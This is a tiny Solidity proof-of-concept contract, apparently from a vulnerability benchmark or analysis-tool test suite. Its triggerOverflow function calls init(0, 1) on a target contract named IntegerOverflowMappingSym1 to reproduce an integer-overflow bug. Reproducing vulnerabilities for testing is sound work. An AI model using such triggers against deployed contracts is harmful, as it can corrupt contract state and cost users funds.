contract Reproduction {
    IntegerOverflowMappingSym1 public target;

    constructor(address _target) {
        target = IntegerOverflowMappingSym1(_target);
    }


    function triggerOverflow() public {
        target.init(0, 1);
    }
}